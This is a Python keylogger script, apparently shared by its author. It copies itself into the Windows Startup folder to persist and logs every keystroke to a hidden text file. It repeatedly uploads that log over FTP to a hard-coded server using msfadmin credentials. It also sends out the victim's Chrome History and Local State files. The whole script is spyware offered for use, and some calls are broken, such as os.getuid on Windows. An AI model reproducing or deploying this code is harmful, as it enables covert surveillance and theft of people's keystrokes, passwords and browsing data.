
######  CREATOR #######

# NAME : GREEJITH -K

# GMAIL: greejithmiui12@gmail.com
  

import ftplib
from pynput.keyboard import Listener, Key
import shutil
import os
from datetime import datetime
import pytz
import time



filepath=os.getcwd() + "\\" + "Key.exe"

#CLOCK SETTINGS
timezone=pytz.timezone("Asia/Kolkata")

datetimenow=datetime.now(timezone)

actualtime=datetimenow.strftime("%H:%M:%S   %d:%m:%Y ")
workpth=os.getcwd()

os.chdir("C:/Users")

useerdir=os.listdir()


username=os.getuid()

os.chdir(workpth)


startuppath="C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" # WINDOWS START UP PATH

try:

    shutil.move(filepath, startuppath) # MOVING  KEYLOGGER  TO WINDOWS STARTUP PATH
except:
    pass

txtlocation="C:/Users/" + username + "/Downloads/enter.txt" #CHENGE THE FILE LOCATION TO LESS COMMON

file=open(txtlocation, "w")
file.close()

totalcount = 1

print(os.getcwd())



#MAIN FUNCTION
def press(key):
    global actualtime, totalcount, username
    text = open(txtlocation, "a")

    stringtext = str(key)
    for keys in stringtext:

        cleartext = str(keys).replace("'", "")

        if key == Key.space:
            text.write("\t \t \t \t \t" + actualtime + "\n")

            break
        # AVOIDE USELESS KEYS
        elif key==Key.caps_lock or key==Key.down or key==Key.up or key==Key.enter or key==Key.shift or key==Key.shift_l or key==Key.shift_r:
            pass
        # WRITE KEYS TO TEXT FILE
        else:
            text.write(cleartext)

        try:
            host = "192.168.1.73" # ENTER FTP SERVER IP

            user = "msfadmin" # PASSWORD

            passw = "msfadmin" # PASSWORD

            file = open(txtlocation, "rb")

            # LOGING AND SENDING FILES TO FTP SEREVER

            ftp = ftplib.FTP(host, user, passw)
            ftp.storbinary("STOR keys.txt", file)
        except:
            pass

        count=time.process_time()

        if count > totalcount:

            try:

                # GETTING GOOGLE CHROME HISTORY FILES

                totalcount += 1                              # FIRST FILE  FOR EXTRACT GOOGLE CHROME HISTORY !!!!!! RELACE THE VICTIME FILE TO OUR SOME LOCATION
                historyfilelocation="C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data/Profile 2/History" 
                history = open(historyfilelocation, "rb")
                ftp = ftplib.FTP(host, user, passw)
                ftp.storbinary("STOR History", history)    # SECOND FILE FOR EXTRACT GOOGLE CHROME HISTORY !!!!!! RELACE THE VICTIME FILE TO OUR SOME LOCATION
                localstate="C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data/Local State" 
                history_journel=open(localstate, "rb")
                ftp.storbinary("STOR Local State", history_journel)

            except:
                continue

    text.close()


# LISTEN FOR KEY STROCK AND PASSING INTO press FUNCTION

with Listener(on_press=press) as listener:
    listener.join()


